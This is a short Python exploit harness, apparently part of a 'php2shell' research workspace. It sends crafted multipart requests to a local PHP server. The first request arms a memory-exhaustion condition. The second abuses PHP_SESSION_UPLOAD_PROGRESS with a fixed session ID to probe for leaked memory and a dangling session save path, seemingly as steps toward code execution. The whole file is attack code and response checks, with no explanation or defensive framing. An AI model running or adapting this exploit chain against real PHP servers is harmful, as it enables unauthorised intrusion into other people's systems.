#!/usr/bin/env python3
import importlib.util, socket
from pathlib import Path

def load(n, p):
    s = importlib.util.spec_from_file_location(n, p)
    m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m

HERE = Path("/tmp/opencode/realapps/side/php2shell")
LEAK = load("l", HERE / "native-output-leak.py")
STOCK = load("s", HERE / "native-output-leak-stock-arm.py")
COMPACT = load("c", HERE / "compact-stock-tail.py")
host, port, path = "127.0.0.1", 28840, "/index.php"
header = f"{host}:{port}"; tmo = 60.0

body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
req = LEAK.request_bytes(header, path, body, None, 23, False)
c = socket.create_connection((host, port), timeout=tmo); c.settimeout(tmo)
c.sendall(req); r1 = LEAK.read_response(c.makefile("rb", buffering=0)); c.close()
print("R1 arm:", r1[3], len(r1[1]), "oom_fatal=", b"Allowed memory" in r1[1] or b"memory size" in r1[1])
print("R1 head:", r1[1][:200])

small = (b'--BNDLING\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nMMM\r\n'
         b'--BNDLING\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n'
         b"Content-Type: application/octet-stream\r\n\r\nY\r\n--BNDLING--\r\n")
req2 = (b"POST " + path.encode() + b" HTTP/1.1\r\nHost: " + header.encode() +
        b"\r\nCookie: PHPSESSID=abcdefgh\r\n"
        b"Content-Type: multipart/form-data; boundary=BNDLING\r\n"
        b"Content-Length: " + str(len(small)).encode() + b"\r\n\r\n" + small)
c2 = socket.create_connection((host, port), timeout=tmo); c2.settimeout(tmo)
c2.sendall(req2); r2 = LEAK.read_response(c2.makefile("rb", buffering=0)); c2.close()
print("R2 same-worker:", r2[3], len(r2[1]), "warn_in_ini=", b"cannot be changed" in r2[1], "save_path_dangling=", b"failed" in r2[1][:0] or b"failed to open" in r2[1])
print("R2 head:", r2[1][:260])
